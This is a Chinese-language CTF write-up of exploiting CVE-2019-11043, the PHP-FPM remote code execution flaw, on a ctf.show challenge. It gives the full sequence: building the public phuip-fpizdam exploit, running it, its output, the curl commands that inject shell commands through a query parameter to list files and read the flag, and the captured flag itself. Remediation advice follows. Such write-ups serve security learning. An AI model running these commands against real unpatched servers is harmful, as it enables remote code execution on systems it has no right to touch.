# CVE-2019-11043漏洞利用过程记录

## 目标信息
- 目标URL: https://e1680aaf-333f-47bc-8e57-64e288e0ce6d.challenge.ctf.show/
- 服务器: nginx/1.20.1
- PHP版本: PHP/7.1.33dev

## 漏洞分析
通过信息收集发现目标服务器使用了存在漏洞的PHP版本(PHP 7.1.33dev)，该版本受CVE-2019-11043漏洞影响。

CVE-2019-11043是一个PHP远程代码执行漏洞，影响以下版本：
- PHP 7.1.x版本小于7.1.33
- PHP 7.2.x版本小于7.2.24
- PHP 7.3.x版本小于7.3.11

该漏洞需要以下条件才能利用：
1. 漏洞版本的PHP
2. Nginx服务器
3. PHP-FPM启用

## 漏洞利用过程

### 1. 安装利用工具
```bash
git clone https://github.com/neex/phuip-fpizdam.git
cd phuip-fpizdam
go build
```

### 2. 检测漏洞
```bash
./phuip-fpizdam https://e1680aaf-333f-47bc-8e57-64e288e0ce6d.challenge.ctf.show/index.php
```

工具输出显示：
```
Base status code is 200
Status code 502 for qsl=1765, adding as a candidate
The target is probably vulnerable. Possible QSLs: [1755 1760 1765]
Attack params found: --qsl 1755 --pisos 189 --skip-detect
Performing attack using php.ini settings...
Success! Was able to execute a command by appending "?a=/bin/sh+-c+'which+which'&" to URLs
```

### 3. 查找flag文件
使用以下命令查找flag文件：
```bash
curl -s "https://e1680aaf-333f-47bc-8e57-64e288e0ce6d.challenge.ctf.show/index.php?a=ls"
```

发现了一个名为`fl0gHe1e.txt`的文件。

### 4. 读取flag文件
使用以下命令读取flag文件：
```bash
curl -s "https://e1680aaf-333f-47bc-8e57-64e288e0ce6d.challenge.ctf.show/index.php?a=/bin/sh+-c+'cat+fl0gHe1e.txt'"
```

成功获取到flag：
```
ctfshow{1fcebdf2-4866-4a6c-8bd9-a76cae9bdb4e}
```

## 漏洞修复建议
1. 升级PHP到安全版本：
   - PHP 7.2.24或更高版本
   - PHP 7.3.11或更高版本
2. 确保nginx配置正确，避免不安全的配置
3. 定期更新和修补服务器软件